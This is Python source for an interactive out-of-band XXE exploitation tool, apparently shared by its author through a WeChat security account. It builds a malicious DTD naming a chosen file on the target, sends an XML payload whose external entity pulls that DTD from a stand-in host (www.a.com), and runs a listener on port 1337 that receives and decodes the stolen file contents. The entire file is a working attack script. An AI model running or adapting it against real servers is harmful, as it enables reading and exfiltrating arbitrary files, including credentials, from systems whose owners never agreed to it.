# -*- coding: utf-8 -*-
# 开发团队   ：漫游边界
# 开发人员   ：Akira
# 开发时间   ：2020/4/19  18:19 
# 文件名称   ：scan_xxe_port.py
# 开发工具   ：PyCharm

import argparse
import socket
from urllib.parse import urlparse
import base64

# 终端颜色
RED = '\033[31m'
BLUE = '\033[94m'
GREEN = '\033[32m'
OTRO = '\033[36m'
BOLD = '\033[1m'
NORMAL = '\033[0m'
END = '\033[0m'


def get_file(url, file):
    print(f'{BLUE}Scan {file.rjust(6)}    -------     waitting{END}')
    open_file(file)
    data_base64 = server_url(url)
    data = base64.b64decode(data_base64).decode()
    print(data)


def open_file(file):        # 打开本地的dtd文件或者VPS上的dtd
    fp = open('D:\\phpEnv\\www\\localhost\\test.dtd', 'r')      # 路径自己选择
    fp_data = fp.read()
    if ':' in file:
        fp_new = fp_data.replace("%FILE%", '/' + file)
    else:
        fp_new = fp_data.replace("%FILE%", file)
    fp_dtd = open('D:\\phpEnv\\www\\localhost\\fp.dtd', 'w+')
    fp_dtd.write(fp_new)
    fp.close()
    fp_dtd.close()


def get_url(url):   # 模拟客户端发送
    url = urlparse(url)
    host = url.netloc
    path = url.path
    if path == '':
        path = "/"
    clinet = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    clinet.connect((host, 80))
    post_data = '<user><username>admin</username><password>admin</password></user>\r\n'
    payload = '<!DOCTYPE replace [\r\n<!ENTITY % xxe SYSTEM "http://www.a.com/fp.dtd">\r\n%xxe;\r\n%wrapper;\r\n%send;\r\n]>'       # VPS或者本机地址
    header = f'POST {path} HTTP/1.1\r\nHost:{host}\r\nX-Requested-With: XMLHttpRequest\r\nContent-Type:application/xml;charset=UTF-8\r\nContent-Length: {len(payload+post_data)}\r\nConnection: close\r\n\r\n'
    clinet.send(f'{header}{payload}{post_data}'.encode('utf8'))
    clinet.close()


def server_url(url):    # 模拟服务器接收
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(("0.0.0.0", 1337))
    server.listen()
    server.settimeout(1)
    get_url(url)
    try:
        data = ''.encode('utf8')
        while True:
            sock, addr = server.accept()
            d = sock.recv(1024)
            if d:
                data += d
            else:
                break
            data = data.split(b' ')[-3].replace(b'/?', b'')
            return data.decode('utf8')
    except:
        pass
    finally:
        server.close()


# def get_parse():
#     parse = argparse.ArgumentParser(description="Scan_xxe file")
#     parse.add_argument("-t", "--target", help='')
#     parse.add_argument("-f", "--file", help='')
#     return parse.parse_args()

def dispaly():
    banner = BOLD + '''
 /$$   /$$ /$$   /$$ /$$$$$$$$
| $$  / $$| $$  / $$| $$_____/
|  $$/ $$/|  $$/ $$/| $$      
 \  $$$$/  \  $$$$/ | $$$$$   
  >$$  $$   >$$  $$ | $$__/   
 /$$/\  $$ /$$/\  $$| $$      
| $$  \ $$| $$  \ $$| $$$$$$$$
|__/  |__/|__/  |__/|________/
        XML Injection XXE            
''' + END
    vision = '''
    Version : 1.0 
    Author : Akira
    WeChat Official Accounts : 漫游边界
    '''
    print(banner + vision)


if __name__ == '__main__':
    dispaly()
    url = input('Please input target url: ')
    while True:
        file = input('Please input target file_name: ')
        get_file(url.strip(), file)
        if file == 'exit':
            print(f'{RED}--------KILL TERMINAL--------{END}')
            break
